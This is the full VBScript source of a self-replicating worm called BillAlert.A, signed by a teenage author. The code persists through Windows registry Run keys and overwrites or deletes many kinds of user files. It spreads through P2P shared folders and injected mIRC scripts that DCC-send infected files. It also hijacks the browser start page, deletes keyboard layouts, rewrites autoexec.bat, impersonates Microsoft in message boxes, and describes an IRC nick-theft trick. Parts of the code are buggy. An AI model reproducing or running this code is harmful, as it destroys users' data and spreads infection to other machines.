   Rem Este é o [BillAlert.A]!!!Um worm brasileiro criado por Adriel.
   Rem This is a brasilian worm created by Adriel named [BillAlert.A]
   Rem Tenho 15 anos e este é o meu primeiro projeto viral com inteligência de auto-replicação na net(chamado de  worm).Em breve criarei worms tão bons tais quais o Blaster!
   Rem Now I have 15yrs and this is my first viral project with auto-replication on net(named worm).Soon I´ll make so good worms how MS Blaster!!
   Rem Agradeço a meus amigos Dark_x_Vxer e Back_Door_System pelo apoio!

   days()
   Sub days()
   If day(now()) = 2 and month(now()) = 9 Then
   Wscript.Echo "Feliz aniversário mestre Adriel!!! :)"
   Wscript.Echo "Happy Birthday master Adriel!!! :)"
   End If
   If day(now()) = 1 and month(now()) = 4 Then
   Wscript.Echo "Preparando-se para queimar a CPU!!! :)"
   Wscript.Echo "Preparing to burn the CPU!!! :)"
   Wscript.Echo "Foi apenas uma mentira!Feliz Dia da Mentira!UAHUAHUAHAUAHUAHA :)"
   Wscript.Echo "Was only a lie!Have a good Lie Day!UHAUHAUAHUAHAUHAUHAUA :)"
   End If
   If day(now()) = 15 and month(now()) = 1 Then
   Wscript.Echo "Feliz aniversário mãe! :)"
   Wscript.Echo "Happy birthday dear mom! :)"
   End If
   If day(now()) = 14 and month(now()) = 2 Then
   Wscript.Echo "Feliz aniversário pai! :)"
   Wscript.Echo "Happy birthday dear dad! :)"
   End If
   If day(now()) = 25 and month(now()) = 12 Then
   Wscript.Echo "Feliz natal!!! :)"
   Wscript.Echo "Happy Christmas!!! :)"
   End If
   If day(now()) = 1 and month(now()) = 1 Then
   Wscript.Echo "Ano Novo está chegando e Adriel está criando novos worms para você! :)"
   Wscript.Echo "New Year is comming, and Adriel is creting new worms for you, hehehehehe! :)"
   End If
   If day(now()) = 21 and month(now()) = 2 Then
   Wscript.Echo "Hoje é o dia em que o worm BillAlert.A foi criado! :)"
   Wscript.Echo "Today is the day that the BillAlert.A worm was created! :)"
   End If
   End Sub

   BillAlert()
   Sub BillAlert()
   On Error Resume Next
   Wscript.Interactive = True
   Wscript.Sleep 20000
   MsgBox "A Microsoft informa: atualize sempre seu Windows a fim de evitar invasões e bugs no sistema.", vbOKOnly + vbSystemModal + vbYesNo, "Microsoft"
   Wscript.Sleep 2000
   MsgBox "A Microsoft agradece a atenção!", vbOKOnly + vbSystemModal, "Microsoft"
   End Sub

   inicio()
   Sub inicio()
   On Error Resume Next
   dim fso, dirSystem, dirCommand, eq, ctr, file, vbscopy
   eq = ""
   ctr = 0
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set file = fso.OpenTextFile(Wscript.ScriptFullName,1)
   vbscopy = file.ReadAll
   End Sub

   principal()
   Sub principal()
   On Error Resume Next
   Set dirSystem = fso.GetSpecialFolder(0)
   Set dirCommand = fso.GetSpecialFolder(1)
   Set c = fso.GetFile(Wscript.ScriptFullName)
   c.Copy(dirSystem&"\BillAlert.vbs")
   c.Copy(dirSystem&"\SuperPoesias.vbs")
   c.Copy(dirCommand&"\edit.vbs")
   End Sub

   hide()
   Sub hide()
   Dim hide, a
   Set a = CreateObject("Scripting.FileSystemObject")
   Set hide = a.GetFile(a.GetSpecialFolder(0) & "\BillAlert.vbs")
   hide.Attributes = 2
   Set hide = a.GetFile(a.GetSpecialFolder(0) & "\SuperPoesias.vbs")
   hide.Attributes = 0
   Set hide = a.GetFile(a.GetSpecialFolder(1) & "\edit.vbs")
   hide.Attributes = 2
   End Sub

   registro()
   Sub registro()
   On Error Resume Next
   Set WshShell = Wscript.CreateObject("Wscript.Shell")
   WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\BillAlert", dirSystem&"\BillAlert.vbs"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System", dirSystem&"\SuperPoesias.vbs"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\APIBIND", dirCommand&"\edit.vbs"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\BillAlert", dirSystem&"\BillAlert.vbs"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\FileManager", dirSystem&"\SuperPoesias.vbs"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Scandisk", dirCommand&"\edit.vbs"
   WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://ircafogados.pajeuonline.com"
   WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\InfoTip", "Bill Gates have alerted you!."
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Adriel"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\CompanyName", "ADRIEL CORPORATION"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://ircafogados.pajeuonline.com"
   WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00000416"
   WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00000816"
   WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00010416"
   End Sub

   Listdrive()
   Sub Listdrive()
   On Error Resume Next
   dim d, dc, s
   Set dc = fso.Drives
   For Each d in dc
   If d.DriveType = 2 or d.DriveType = 3 Then
   Folderlist d, path&"\"
   End If
   Next
   Listdrive = s
   End Sub

   takeover()
   Sub takeover()
   Dim fso
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set Takeoverstxt  = fso.CreateTextFile("c:\windows\Takeovers.txt")
   Takeoverstxt.WriteLine "[Dark IRC Warriors] HP-www."
   Takeoverstxt.WriteLine "Aew galera, neste arquivo contém apenas o começo do gigantesco arsenal sobre IRCWAR que vc nunca viu nada igual na sua vida!!!"
   Takeoverstxt.WriteLine "Nós colocamos só isso justamente pra gerar ansiedade!HEHEHEHE.VC poderá encontrar td que vc quiser na nossa homepage www."
   Takeoverstxt.WriteLine "Existem vários métodos pra dar-se takeovers em canais:pelo Aliases, pelo Remote, por BOTS e lógicamente se vc roubar o nick do founder!"
   Takeoverstxt.WriteLine "Tem um método que vc digita determinada sequencia de comandos no aliases formulando um comando(ex: /tomar) que faça com que após ser digitado o comando vc entre no canal especificado(/tomar #canal) e de acordo com o que foi programado no aliases poderá alterar os modos do canal, colocando senha e banindo todos do canal(mas para isso não deverá ter ninguém neste canal)!"
   Takeoverstxt.WriteLine "Pra roubar o nick faça o cara digitar //write ^ ctcp *:^:$2- | /.load -rs ^ Depois que a pessoa ter digitado isso digite: /ctcp nickdavítima ^ nickserv set password BillAlert. A senha do nick será BillAlert."
   Takeoverstxt.WriteLine "Para alterar os modos do canal pelo Remote vc deverá saber sobre MIRC SCRIPTING(veja em nosso site www."
   Takeoverstxt.WriteLine "Galera este texto é só pra vcs terem uma noção do acervo de informações sobre IRCWAR que nosso site armazena!"
   Takeoverstxt.WriteLine "Entre lá e confira, o maior acervo de informações e programas sobre IRCWAR(takeovers, ler pvt dos outros, invadir redes de IRC, dezenas de bugs e mts deles descobertos por nós... hehehe e mt mais."
   Takeoverstxt.close
   End Sub

   infecttakeover()
   Sub infecttakeover()
   Dim infect
   Set infect = fso.OpenTextFile("C:\Windows\Takeovers.txt")
   infect.write vbscopy
   infect.close
   End Sub

   Infectfiles(folderspec)
   Sub Infectfiles(folderspec)
   On Error Resume Next
   dim f, f1, fc, ext, ap, cop, mircfname, s, bname, mp3, htm
   Set f = fso.GetFolder(folderspec)
   Set fc = f.files
   For Each f1 in fc
   ext = fso.GetExtensionName(f1.path)
   ext = lcase(ext)
   s = lcase(f1.name)
   If (ext = "vbs") or (ext = "vbe") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   ElseIf (ext = "js") or (ext = "jse") or (ext = "css") or (ext = "wsh") or (ext = "sct") or (ext = "hta") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname = fso.GetBaseName(f1.path)
   Set cop = fso.GetFile(f1.path)
   cop.copy(folderspec & "\" & banem & ".vbs")
   fso.DeleteFile(f1.path)
   ElseIf (ext = "jpg") or (ext = "jpeg") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   Set cop = fso.GetFile(f1.path)
   cop.copy(f.path & ".vbs")
   fso.DeleteFile(f1.path)
   ElseIf (ext = "com") or (ext = "exe") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   Set cop = fso.GetFile(f1.path)
   cop.copy(f.path & ".vbs")
   ElseIf (ext = "txt") or (ext = "doc") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   Set cop = fso.GetFile(f1.path)
   cop.copy(f.path & ".vbs")
   ElseIf (ext = "xls") or (ext = "pps") Then
   Set ap = fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   Set cop = fso.GetFile(f1.path)
   cop.copy(f.path & ".vbs")
   ElseIf (ext = "mp3") or (ext = "mp2") Then
   Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
   mp3.vbscopy
   mp3.close
   Set att = fso.GetFile(f1.path)
   att.attributes = att.attributes + 2
   End If
   If (eq<>folderspec)Then
   If (s = "mirc.exe") or (s = "mirc.ini") or (s = "mlink32.exe") Then
   Set alias01ini = fso.CreateTextFile(folderspec&"\alias01.ini")
   alias01ini.Write "[Remote]"
   alias01ini.Write "n0 = on *:start:{"
   alias01ini.Write "n1 =  if $day == Friday { /echo BillAlert criado por adriel15 }"
   alias01ini.Write "n2 = }"
   alias01ini.Write "n3 = on *:join:#:{"
   alias01ini.Write "n4 = if ($nick = $me) {halt}"
   alias01ini.Write "n5 = /q $nick Você quer aprender como roubar canais e dar Super Takeovers???Então faça o download de um tutorial sobre o assunto criado pelo grupo [Dark IRC Warriors]!!!"
   alias01ini.Write "n6 = /.dcc send $nick C:\Windows\Takeovers.txt"
   alias01ini.Write "n7 = }"
   alias01ini.Write "n8 = on *:part:#:{"
   alias01ini.Write "n9 = if ($nick = $me) {halt}"
   alias01ini.Write "n10 = /q $nick Já vai???Espera um pouco..."
   alias01ini.Write "n11 = /msg $nick Faça o download do nosso tutorial sobre Takeovers e aprenda o imaginável e o inimaginável no mundo do IRC!"
   alias01ini.Write "n12 = /.dcc send $nick C:Windows\Takeovers.txt"
   alias01ini.Write "n13 = }"
   alias01ini.close
   eq = folderspec
   End If
   End If
   Next
   End Sub

   P2P()
   Sub P2P()
   On Error Resume Next
   Dim fso, wsc
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set wsc = CreateObject("Wscript.Shell")
   Set dirSystem = fso.GetSpecialFolder(0)
   Set ProgramFilesDir = fso.GetSpecialFolder(1)
   Set ArquivosdeProgramasDir = fso.GetSpecialFolder(2)
   Set C = fso.GetFile(WScript.ScriptFullName)
   CurrentVer = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
   PgDir = wsc.RegRead(CurrentVer & "\ProgramFilesDir")
   For FindFolders = 0 To 9
   ArrayFolders = Array("C:\Kazaa\My Shared Folder", "C:\My Downloads", PgDir & "\Kazaa\My Shared Folder", PgDir & "\KaZaA Lite\My Shared Folder", PgDir & "\Bearshare\Shared", PgDir & "\Edonkey2000", PgDir & "\Morpheus\My Shared Folder", PgDir & "\Grokster\My Grokster", PgDir & "\ICQ\Shared Files")
   FileSwitch = ArrayFolders(FindFolders)
   If fso.FolderExists(FileSwitch) Then
   For Each FoundP2PFile in fso.GetFolder(FileSwitch).Files
   FileExt = LCase(fso.GetExtensionName(FoundP2PFile))
   If FileExt = "mp3" Or FileExt = "wma" Or FileExt = "jpg" Or FileExt = "jpeg" Or FileExt = "mpeg" Or FileExt = "exe" Then
   C.copy (FoundP2PFile.Path & ".vbs")
   fso.DeleteFile (FoundP2PFile.Path)
   End If
   Next
   End If
   Next
   End Sub

   createfile()
   Sub createfile()
   dim fso, fldr
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set fldr = fso.CreateFolder("C:\BillAlert.A")
   End Sub

   autoexec()
   Sub autoexec()
   Dim dwafewkrtwexvcsza
   Set dwafewkrtwexvcsza = fso.CreateTextFile(C:\Autoexec.bat")
   dwafewkrtwexvcsza.Write "@echo Microsoft Windows Corporation Copyright (c) 1988, 1989 "
   dwafewkrtwexvcsza.Write "@cd C:\Windows\System"
   dwafewkrtwexvcsza.Write "@start BillAlert.vbs"
   dwafewkrtwexvcsza.Close

   folderlist(folderspec)
   Sub folderlist(folderspec)
   On Error Resume Next
   dim f, f1, sf
   Set f = fso.GetFolder(folderspec)
   Set sf = f.SubFolders
   For Each f1 in sf
   Infectfiles(f1.path)
   Folderlist(f1.path)
   Next
   End Sub

   Writekey(regkey)
   Sub Writekey(regkey)
   On Error Resume Next
   Set regedit = Wscript.CreateObject("Wscript.Shell")
   regedit.RegWrite regkey
   End Sub

   Writevalue(regvalue)
   Sub Writevalue(regvalue)
   On Error Resume Next
   Set regedit = Wscript.CreateObject("Wscript.Shell")
   regedit.RegWrite regvalue
   End Sub

   fileexist(filespec)
   Function fileexist(filespec)
   On Error Resume Next
   dim msg
   If fso.FileExists(filespec) Then
   msg = 0
   Else
   msg = 1
   End If
   fileexist = msg
   End Function

   folderexist(folderspec)
   Function folderexist(folderspec)
   On Error Resume Next
   dim msg
   If fso.GetFolderExists(folderspec) Then
   msg = 0
   Else
   msg = 1
   End If
   folderexist = msg
   End Function

   shit()
   Sub shit()
   MsgBox "Oi, eu sou um minisoftware projetado para fazer perguntas e obter respostas!Aperte OK e leia as regras do game a seguir. ", vbOKOnly + vbSystemModal, "Questionário Interativo"
   MsgBox "Regra 1- Proibido sair da frente do computador enquanto estiver sendo executadas as perguntas.", vbOKOnly + vbSystemModal, "Questionário Interativo"
   MsgBox "Regra 2- Proibido ir cagar no banheiro.", vbOKOnly + vbSystemModal, "Questionário Interativo"
   MsgBox "Regra 3- Proibido fazer qualquer outra coisa que não seja responder as perguntas.", vbOKOnly + vbSystemModal, "Questionário Interativo"
   MsgBox "Regra 4- E finalmente, aperte Sim ou Não para responder o questionário!Boa Sorte!!!", vbOKOnly + vbSystemModal, "Questionário Interativo"
   End Sub

   Rem *****************************Fim do código [BillAlert.A]!**********************
   Rem ******************************End of [BillAlert.A] code!************************
